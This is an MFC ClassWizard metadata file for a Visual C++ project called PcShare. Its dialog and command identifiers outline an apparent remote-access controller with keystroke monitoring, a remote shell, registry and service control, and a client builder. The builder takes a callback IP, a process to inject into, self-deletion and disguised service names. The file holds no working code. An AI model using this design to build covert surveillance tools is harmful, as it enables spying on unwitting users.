; CLW file contains information for the MFC ClassWizard

[General Info]
Version=1
LastClass=CMyCreateClientDlg
LastTemplate=CDialog
NewFileInclude1=#include "stdafx.h"
NewFileInclude2=#include "PcShare.h"
LastPage=0

ClassCount=9
Class1=CPcShareApp
Class2=CAboutDlg
Class3=CMainFrame

ResourceCount=9
Resource1=IDR_MENU_LOG_LIST
Resource2=IDR_MENU_FILE_MANA
Resource3=IDD_DIALOG_CREATE_CLIENT
Class4=CMySetupDlg
Resource4=IDD_DIALOG_SETUP
Class5=CMyCreateClientDlg
Filter=D
BaseClass=CDialog
VirtualFilter=dWC
LastObject=CMyCreateClientDlg
Resource5=IDD_DIALOG_KEYHOOK
Resource6=IDD_DIALOG_TLNT
Resource7=IDD_DIALOG_CLIENT_TITLE
Class6=CMyClientTitleDlg
Class7=CMyHtmlView
Class8=CMyEventView
Resource8=IDD_DIALOG_CLIENT_PROXY
Class9=CMyClientProxy
Resource9=IDR_MAINFRAME

[CLS:CPcShareApp]
Type=0
HeaderFile=PcShare.h
ImplementationFile=PcShare.cpp
Filter=N
BaseClass=CWinApp
VirtualFilter=AC
LastObject=CPcShareApp

[CLS:CMainFrame]
Type=0
HeaderFile=MainFrm.h
ImplementationFile=MainFrm.cpp
Filter=T
BaseClass=CFrameWnd
VirtualFilter=fWC
LastObject=CMainFrame




[CLS:CAboutDlg]
Type=0
HeaderFile=PcShare.cpp
ImplementationFile=PcShare.cpp
Filter=D
LastObject=CAboutDlg
BaseClass=CDialog
VirtualFilter=dWC

[ACL:IDR_MAINFRAME]
Type=1
Class=CMainFrame
Command1=ID_FILE_NEW
Command2=ID_FILE_OPEN
Command3=ID_FILE_SAVE
Command4=ID_EDIT_UNDO
Command5=ID_EDIT_CUT
Command6=ID_EDIT_COPY
Command7=ID_EDIT_PASTE
Command8=ID_EDIT_UNDO
Command9=ID_EDIT_CUT
Command10=ID_EDIT_COPY
Command11=ID_EDIT_PASTE
Command12=ID_NEXT_PANE
Command13=ID_PREV_PANE
CommandCount=13

[TB:IDR_MAINFRAME]
Type=1
Class=?
Command1=ID_CLIENT_FILE_MANAGER
Command2=ID_FRAME_MONITOR
Command3=ID_TLNT
Command4=ID_MONITORKEY
Command5=ID_PROC
Command6=ID_REGEDIT
Command7=ID_SERVICE
Command8=ID_MUILT
Command9=ID_GLOBAL_SETUP
Command10=ID_CLIENT_CREATE
CommandCount=10

[DLG:IDD_DIALOG_SETUP]
Type=1
Class=CMySetupDlg
ControlCount=10
Control1=IDC_EDIT_PORT_MAIN,edit,1350639744
Control2=IDC_SPIN_PORT_MAIN,msctls_updown32,1342177462
Control3=IDC_EDIT_MAX_LINK_MAIN,edit,1350639744
Control4=IDC_SPIN_MAX_LINK_MAIN,msctls_updown32,1342177462
Control5=IDOK,button,1342242817
Control6=IDCANCEL,button,1342242816
Control7=IDC_STATIC,static,1342308352
Control8=IDC_STATIC,static,1342308352
Control9=IDC_STATIC,static,1342181380
Control10=IDC_STATIC,static,1342179843

[CLS:CMySetupDlg]
Type=0
HeaderFile=MySetupDlg.h
ImplementationFile=MySetupDlg.cpp
BaseClass=CDialog
Filter=D
LastObject=CMySetupDlg
VirtualFilter=dWC

[DLG:IDD_DIALOG_CREATE_CLIENT]
Type=1
Class=CMyCreateClientDlg
ControlCount=18
Control1=IDC_COMBO_IPLIST,combobox,1344340226
Control2=IDC_EDIT_PORT,edit,1350639744
Control3=IDC_BUTTON_CREATE,button,1342242816
Control4=IDCANCEL,button,1342242816
Control5=IDC_STATIC,static,1342308352
Control6=IDC_STATIC,static,1342308352
Control7=IDC_STATIC,static,1342308352
Control8=IDC_COMBO_PROC,combobox,1344339971
Control9=IDC_STATIC,static,1342308352
Control10=IDC_EDIT_CONTROL_DLL,edit,1350631552
Control11=IDC_BDELETESELF,button,1342259203
Control12=IDC_STATIC,button,1342177287
Control13=IDC_STATIC,static,1342308352
Control14=IDC_STATIC,static,1342308352
Control15=IDC_STATIC,static,1342308352
Control16=IDC_SERVICENAME,edit,1350631552
Control17=IDC_SERVIECEDISPLAY,edit,1350631552
Control18=IDC_SERVICEMARK,edit,1350631552

[CLS:CMyCreateClientDlg]
Type=0
HeaderFile=MyCreateClientDlg.h
ImplementationFile=MyCreateClientDlg.cpp
BaseClass=CDialog
Filter=D
LastObject=ID_SERVICE
VirtualFilter=dWC

[DLG:IDD_DIALOG_CLIENT_TITLE]
Type=1
Class=CMyClientTitleDlg
ControlCount=3
Control1=IDC_EDIT_TITLE,edit,1350631552
Control2=IDOK,button,1342242817
Control3=IDC_STATIC,static,1342308352

[CLS:CMyClientTitleDlg]
Type=0
HeaderFile=MyClientTitleDlg.h
ImplementationFile=MyClientTitleDlg.cpp
BaseClass=CDialog
Filter=D
LastObject=CMyClientTitleDlg
VirtualFilter=dWC

[CLS:CMyEventView]
Type=0
HeaderFile=MyEventView.h
ImplementationFile=MyEventView.cpp
BaseClass=CListView
Filter=C
LastObject=CMyEventView
VirtualFilter=VWC

[MNU:IDR_MAINFRAME]
Type=1
Class=?
Command1=ID_APP_EXIT
Command2=ID_GLOBAL_SETUP
Command3=ID_CLIENT_CREATE
CommandCount=3

[DLG:IDD_DIALOG_KEYHOOK]
Type=1
Class=?
ControlCount=1
Control1=IDC_EDIT_TEXT,edit,1352730692

[DLG:IDD_DIALOG_TLNT]
Type=1
Class=?
ControlCount=6
Control1=IDC_EDIT_SEND,edit,1350631552
Control2=IDOK,button,1342242817
Control3=IDC_EDIT_TEXT,edit,1352728644
Control4=IDC_STATIC_TITLE,static,1342308352
Control5=IDC_STATIC_CMD,static,1342308352
Control6=IDC_STATIC_TITILE,static,1342308352

[CLS:CMyHtmlView]
Type=0
HeaderFile=MyHtmlView.h
ImplementationFile=MyHtmlView.cpp
BaseClass=CHtmlView
Filter=C
LastObject=CMyHtmlView

[MNU:IDR_MENU_FILE_MANA]
Type=1
Class=?
Command1=ID_CLIENT_PRO_UNINSTALL
Command2=ID_CLIENT_PC_SHUTDOWN
Command3=ID_CLIENT_PC_RESTART
Command4=ID_MODIFY_TITLE
Command5=ID_CLIENT_PROXY
CommandCount=5

[MNU:IDR_MENU_LOG_LIST]
Type=1
Class=?
Command1=ID_LIST_DELETE_ITEM
Command2=ID_LIST_EMPTY_ITEM
Command3=ID_SAVE_LIST_LOG
CommandCount=3

[DLG:IDD_DIALOG_CLIENT_PROXY]
Type=1
Class=CMyClientProxy
ControlCount=3
Control1=IDC_EDIT_TITLE,edit,1350631552
Control2=IDOK,button,1342242817
Control3=IDC_STATIC,static,1342308352

[CLS:CMyClientProxy]
Type=0
HeaderFile=MyClientProxy.h
ImplementationFile=MyClientProxy.cpp
BaseClass=CDialog
Filter=D
LastObject=IDC_EDIT_TITLE
VirtualFilter=dWC

